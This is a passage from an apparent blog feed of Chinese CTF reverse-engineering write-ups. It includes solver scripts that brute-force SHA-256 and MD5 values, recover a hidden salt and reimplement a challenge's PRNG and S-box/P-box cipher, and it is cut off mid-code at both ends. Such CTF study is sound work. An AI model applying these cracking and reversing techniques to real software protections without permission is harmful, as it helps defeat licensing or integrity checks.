class="hljs-number">0x88</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC0</span>,<br>    <span class="hljs-comment"># 11</span><br>    <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x29</span>,<br>    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x29</span>,<br>    <span class="hljs-comment"># 12</span><br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>,<br>    <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x87</span><br>]<br><br><span class="hljs-comment"># 转为 bytes</span><br>hashes_bytes = <span class="hljs-built_in">bytes</span>(hashes)<br><span class="hljs-comment"># 分割为 12 个 32 字节块</span><br>hash_list = [hashes_bytes[i:i+<span class="hljs-number">32</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">384</span>, <span class="hljs-number">32</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_3byte_sha256</span>(<span class="hljs-params">target_hash</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000000</span>):  <span class="hljs-comment"># 0x000000 ~ 0xFFFFFF</span><br>        b1 = (i &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span><br>        b2 = (i &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span><br>        b3 = i &amp; <span class="hljs-number">0xFF</span><br>        data = <span class="hljs-built_in">bytes</span>([b1, b2, b3])<br>        h = hashlib.sha256(data).digest()<br>        <span class="hljs-keyword">if</span> h == target_hash:<br>            <span class="hljs-keyword">return</span> data<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>result = []<br><span class="hljs-keyword">for</span> idx, h <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(hash_list):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Brute-forcing block <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>/12...&quot;</span>)<br>    plain = brute_force_3byte_sha256(h)<br>    <span class="hljs-keyword">if</span> plain <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Failed to crack block <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>        result.append(<span class="hljs-string">b&quot;???&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;    Found: <span class="hljs-subst">&#123;plain.<span class="hljs-built_in">hex</span>()&#125;</span> -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">repr</span>(plain)&#125;</span>&quot;</span>)<br>        result.append(plain)<br><br>flag = <span class="hljs-string">b&quot;&quot;</span>.join([block[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> result[::-<span class="hljs-number">1</span>]])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;argv[1] = <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(flag)&#125;</span> bytes&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>L3Hctf部分wp</title>
    <link href="/2025/08/02/L3Hctf%E9%83%A8%E5%88%86wp/"/>
    <url>/2025/08/02/L3Hctf%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="TemporalParadox"><a href="#TemporalParadox" class="headerlink" title="TemporalParadox"></a>TemporalParadox</h1><p>写这一题用了快半天的时间www，反正得先把函数都理解透了才行</p><p>先找到主函数入口，有一个花指令，nop掉之后反编译</p><p>这里直接跳转，中间插入的就是花指令</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507162340547.png" alt="image-20250716234017426"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930772.png" alt="image-20250716224607175"></p><p>注意，以下函数运行在所给的时间节点下v61 &gt; 1751990400 &amp;&amp; v61 &lt;&#x3D; 1752052051，主要看sub_140001963函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930156.png" alt="image-20250716231843615"></p><p>具体分析看注释</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507162319533.png" alt="image-20250716231900454"></p><p>大概就是通过计算两个表达式是否相等来决定字符串的拼接，然后计算字符串的md5的值看是否与所给的密文相等</p><p>Salt: tlkyeueq7fej8vtzitt26yl24kswrgm5  固定值，通过以下代码得到</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">import math<br><br>dword_14000B060 = [<br>    <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xFFFFFF94</span>, <span class="hljs-number">0xFFFFFF86</span>, <span class="hljs-number">0xFFFFFF9A</span>, <span class="hljs-number">0xFFFFFF8A</span>, <span class="hljs-number">0xFFFFFF9A</span>, <span class="hljs-number">0xFFFFFF8E</span>,<br>    <span class="hljs-number">0xFFE7AC2D</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0xFFFFFF9A</span>, <span class="hljs-number">0x000000AE</span>, <span class="hljs-number">0xFFB70487</span>, <span class="hljs-number">0x000000D2</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x000000DE</span>,<br>    <span class="hljs-number">0xFFFFFF96</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0xFFFFE65F</span>, <span class="hljs-number">0xFFF7E40F</span>, <span class="hljs-number">0xFFFFFF86</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xFFFFE65F</span>,<br>    <span class="hljs-number">0xFFFF1957</span>, <span class="hljs-number">0xFFFFFF94</span>, <span class="hljs-number">0xFFFFFF8C</span>, <span class="hljs-number">0xFFFFFF88</span>, <span class="hljs-number">0x000000C6</span>, <span class="hljs-number">0xFFFFFF98</span>, <span class="hljs-number">0xFFFFFF92</span>, <span class="hljs-number">0xFFFD4C05</span><br>]<br><br>salt_chars = []<br><br>for v9 <span class="hljs-keyword">in</span> dword_14000B060:<br>    if v9 &gt;= <span class="hljs-number">0x80000000</span>:  # 转换负数<br>        v9 -= <span class="hljs-number">0x100000000</span><br>    if v9 &gt;= <span class="hljs-number">0</span>:<br>        v10 = v9 // <span class="hljs-number">3</span> + <span class="hljs-number">48</span><br><span class="hljs-symbol">    else:</span><br>        if v9 &gt;= -<span class="hljs-number">728</span>:<br>            v10 = ~v9<br><span class="hljs-symbol">        else:</span><br>            v10 = <span class="hljs-keyword">int</span>(math<span class="hljs-number">.</span>log(-v9) / <span class="hljs-number">1.09861228866811</span> - <span class="hljs-number">6.0</span> + <span class="hljs-number">48.0</span>)<br>    salt_chars<span class="hljs-number">.</span>append(chr(v10))<br><br>salt = <span class="hljs-string">&#x27;&#x27;.join(salt_chars)</span><br><span class="hljs-string">print(&quot;Salt:&quot;, salt)</span><br></code></pre></td></tr></table></figure><p>r,a,b,x,y都与随机数生成有关，cipher的生成来自于函数sub_14000184D，同时也与两个置换盒有关</p><p>第 1～3 轮每轮用 sub_1400016A0的片段 xor 进状态，再做 s盒与p盒变换。</p><p>第 4 轮取第 4 片段 XOR，再做 仅 S盒；最后取第 5 片段再 xor，返回 cipher。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507162331214.png" alt="image-20250716233103122"></p><p>这里的判断条件也与随机生成数有关，最终可以通过爆破来实现</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930916.png" alt="image-20250716233149894"></p><p>整个过程就可以分为字符串为salt&#x3D;xxx&amp;t&#x3D;xxx&amp;r&#x3D;xxx&amp;a&#x3D;xxx&amp;b&#x3D;xxx&amp;x&#x3D;xxx&amp;y&#x3D;xxx和salt&#x3D;xxx&amp;t&#x3D;xxx&amp;r&#x3D;xxx&amp;cipher&#x3D;xxx两种进行爆破（最终结果是满足salt&#x3D;xxx&amp;t&#x3D;xxx&amp;r&#x3D;xxx&amp;a&#x3D;xxx&amp;b&#x3D;xxx&amp;x&#x3D;xxx&amp;y&#x3D;xxx这个字符串爆破成功）</p><p>这里贴出脚本，由于要用到openssl这个库，我直接在虚拟机上运行代码了，安装这个库也比在windows端方便多</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-meta">#include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#include &lt;stdint.h&gt;</span><br><span class="hljs-meta">#include &lt;string.h&gt;</span><br><span class="hljs-meta">#include &lt;math.h&gt;</span><br><span class="hljs-meta">#include &lt;openssl/md5.h&gt;</span><br><span class="hljs-meta">#include &lt;openssl/sha.h&gt;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SALT &quot;tlkyeueq7fej8vtzitt26yl24kswrgm5&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TARGET_MD5 &quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> uint8_t SBOX[<span class="hljs-number">16</span>] = &#123;<br>    <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x01</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0x03</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x0C</span>,<br>    <span class="hljs-number">0x05</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span><br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> uint8_t PERM[<span class="hljs-number">16</span>] = &#123;<br>    <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13</span>,<br>    <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>,<br>    <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>,<br>    <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> inline uint32_t <span class="hljs-title">truncate_to_u32</span>(<span class="hljs-params">uint64_t v</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> (uint32_t)(v &amp; <span class="hljs-number">0xFFFFFFFF</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> int32_t <span class="hljs-title">to_signed32</span>(<span class="hljs-params">uint32_t v</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (v &amp; <span class="hljs-number">0x80000000</span>)<br>        <span class="hljs-keyword">return</span> (int32_t)(v - <span class="hljs-number">0x100000000</span>);<br>    <span class="hljs-keyword">return</span> (int32_t)v;<br>&#125;<br><br><span class="hljs-comment">// 伪随机数生成器</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">prng_generate</span>(<span class="hljs-params">uint32_t *state, uint32_t *output</span>)</span> &#123;<br>    uint32_t val = *state;<br>    uint32_t v1 = (((val &lt;&lt; <span class="hljs-number">13</span>) ^ val) &gt;&gt; <span class="hljs-number">17</span>) ^ ((val &lt;&lt; <span class="hljs-number">13</span>) ^ val);<br>    uint32_t new_val = (<span class="hljs-number">32</span> * v1) ^ v1;<br>    *state = new_val;<br>    *output = new_val &amp; <span class="hljs-number">0x7FFFFFFF</span>;<br>&#125;<br><br><span class="hljs-function">uint32_t <span class="hljs-title">apply_sbox</span>(<span class="hljs-params">uint32_t input</span>)</span> &#123;<br>    uint32_t s = input;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        uint8_t index = (s &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0xF</span>;<br>        s = ((s &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | SBOX[index];<br>    &#125;<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><br><span class="hljs-function">uint32_t <span class="hljs-title">apply_pbox</span>(<span class="hljs-params">uint32_t input</span>)</span> &#123;<br>    uint32_t s = input;<br>    uint32_t result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-built_in">int</span> src_bit = PERM[i] - <span class="hljs-number">1</span>; <br>        <span class="hljs-keyword">if</span> ((s &gt;&gt; src_bit) &amp; <span class="hljs-number">1</span>) &#123;<br>            result |= (<span class="hljs-number">1</span> &lt;&lt; i);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// 一轮加密变换</span><br><span class="hljs-function">uint32_t <span class="hljs-title">perform_round</span>(<span class="hljs-params">uint32_t state</span>)</span> &#123;<br>    state = apply_sbox(state);<br>    state = apply_pbox(state);<br>    <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-comment">// 生成某轮轮密钥</span><br><span class="hljs-function">uint16_t <span class="hljs-title">generate_round_key</span>(<span class="hljs-params">uint32_t key, <span class="hljs-built_in">int</span> round</span>)</span> &#123;<br>    uint32_t shifted = (key &lt;&lt; (<span class="hljs-number">4</span> * (round - <span class="hljs-number">1</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span>;<br>    <span class="hljs-keyword">return</span> (shifted &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>;<br>&#125;<br><br><span class="hljs-comment">// 加密主函数，生成cipher</span><br><span class="hljs-function">uint16_t <span class="hljs-title">encrypt_token</span>(<span class="hljs-params">uint32_t timestamp, uint32_t round_key</span>)</span> &#123;<br>    uint32_t state = timestamp;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> round = <span class="hljs-number">1</span>; round &lt;= <span class="hljs-number">3</span>; round++) &#123;<br>        uint16_t rk = generate_round_key(round_key, round);<br>        state ^= rk;<br>        state = perform_round(state);<br>    &#125;<br><br>    uint16_t rk4 = generate_round_key(round_key, <span class="hljs-number">4</span>);<br>    state ^= rk4;<br>    state = apply_sbox(state);<br><br>    uint16_t rk5 = generate_round_key(round_key, <span class="hljs-number">5</span>);<br>    uint16_t final_state = (uint16_t)(state ^ rk5);<br>    <span class="hljs-keyword">return</span> final_state;<br>&#125;<br><br><span class="hljs-comment">// 计算字符串的MD5并转hex</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">compute_md5_hex</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span>* input, <span class="hljs-built_in">char</span> output[<span class="hljs-number">33</span>]</span>)</span> &#123;<br>    unsigned <span class="hljs-built_in">char</span> digest[MD5_DIGEST_LENGTH];<br>    MD5((<span class="hljs-keyword">const</span> unsigned <span class="hljs-built_in">char</span>*)input, strlen(input), digest);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; MD5_DIGEST_LENGTH; i++) &#123;<br>        sprintf(output + i * <span class="hljs-number">2</span>, <span class="hljs-string">&quot;%02x&quot;</span>, digest[i]);<br>    &#125;<br>    output[<span class="hljs-number">32</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 计算字符串的SHA1并转hex</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">compute_sha1_hex</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span>* input, <span class="hljs-built_in">char</span> output[<span class="hljs-number">41</span>]</span>)</span> &#123;<br>    unsigned <span class="hljs-built_in">char</span> digest[SHA_DIGEST_LENGTH];<br>    SHA1((<span class="hljs-keyword">const</span> unsigned <span class="hljs-built_in">char</span>*)input, strlen(input), digest);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; SHA_DIGEST_LENGTH; i++) &#123;<br>        sprintf(output + i * <span class="hljs-number">2</span>, <span class="hljs-string">&quot;%02x&quot;</span>, digest[i]);<br>    &#125;<br>    output[<span class="hljs-number">40</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span> &#123;<br>    <span class="hljs-built_in">char</span> query[<span class="hljs-number">512</span>];<br>    <span class="hljs-built_in">char</span> md5_str[<span class="hljs-number">33</span>];<br>    <span class="hljs-built_in">char</span> sha1_str[<span class="hljs-number">41</span>];<br><br>    <span class="hljs-keyword">for</span> (uint32_t t = <span class="hljs-number">1751990400</span>; t &lt;= <span class="hljs-number">1752052051</span>; t++) &#123;<br>        uint32_t state = t;<br>        uint32_t output;<br>        prng_generate(&amp;state, &amp;output);<br>        uint32_t cnt = output;<br><br>        uint32_t a = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>, x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>;<br>        uint32_t i = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (i &lt; cnt) &#123;<br>            prng_generate(&amp;state, &amp;a);<br>            prng_generate(&amp;state, &amp;b);<br>            prng_generate(&amp;state, &amp;x);<br>            prng_generate(&amp;state, &amp;y);<br>            prng_generate(&amp;state, &amp;cnt);<br>            i++;<br>        &#125;<br><br>        prng_generate(&amp;state, &amp;output);<br>        uint32_t r = output;<br><br>        int32_t sa = to_signed32(a);<br>        int32_t sb = to_signed32(b);<br>        int32_t sx = to_signed32(x);<br>        int32_t sy = to_signed32(y);<br><br>        <span class="hljs-built_in">double</span> val1 = pow((<span class="hljs-built_in">double</span>)(sa | sx), <span class="hljs-number">2.0</span>);<br>        <span class="hljs-built_in">double</span> val2 = pow((<span class="hljs-built_in">double</span>)(sb | sy), <span class="hljs-number">2.0</span>);<br><br>        <span class="hljs-keyword">if</span> (fabs(<span class="hljs-number">0x61</span> * val1 - <span class="hljs-number">0xb</span> * val2) &lt; <span class="hljs-number">1e-9</span>) &#123;<br>            uint16_t cipher = encrypt_token(t, r);<br>            snprintf(query, <span class="hljs-keyword">sizeof</span>(query), <span class="hljs-string">&quot;salt=%s&amp;t=%u&amp;r=%u&amp;cipher=%u&quot;</span>,<br>                    SALT, t, r, cipher);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            snprintf(query, <span class="hljs-keyword">sizeof</span>(query), <span class="hljs-string">&quot;salt=%s&amp;t=%u&amp;r=%u&amp;a=%u&amp;b=%u&amp;x=%u&amp;y=%u&quot;</span>,<br>                    SALT, t, r, a, b, x, y);<br>        &#125;<br><br>        compute_md5_hex(query, md5_str);<br>        <span class="hljs-keyword">if</span> (strcmp(md5_str, TARGET_MD5) == <span class="hljs-number">0</span>) &#123;<br>            compute_sha1_hex(query, sha1_str);<br>            printf(<span class="hljs-string">&quot;[+] Found!\nQuery: %s\nMD5: %s\nSHA1: %s\n&quot;</span>,<br>                query, md5_str, sha1_str);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930921.png" alt="image-20250716233822571"></p><h1 id="终焉之门"><a href="#终焉之门" class="headerlink" title="终焉之门"></a>终焉之门</h1><p>直接看看不到什么有用的代码，就直接动调，随便翻翻就看到了这个多层base64，解密一下hhhhh</p><p>后来知道这一段是用来循环异或加密得到主要逻辑的</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930627.png" alt="image-20250717165521134"></p><p>aVersion430Core动调的时候双击进去看看，主加密内容放在了.data段</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930246.png" alt="image-20250718000630226"></p><p>这段代码实现了一个运行在 GPU 上的简单虚拟机，通过执行<code>opcodes</code>中的指令序列，对栈数据进行运算</p><p>这里是核心校验</p><p>栈中的前 16 个数，必须等于 <code>cipher[i] - 20</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930578.png" alt="image-20250718215943468"></p><hr><p>还可以通过另一个方法得到主要的逻辑</p><p>我先搜索字符串，找到那么一串base64编码，然后交叉引用找到函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930465.png" alt="image-20250719213918550"></p><p>这个加密函数调用aVersion430Core的内容与base64编码进行循环异或</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930198.png" alt="image-20250719214002648"></p><p>写出代码可以直接跑出内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 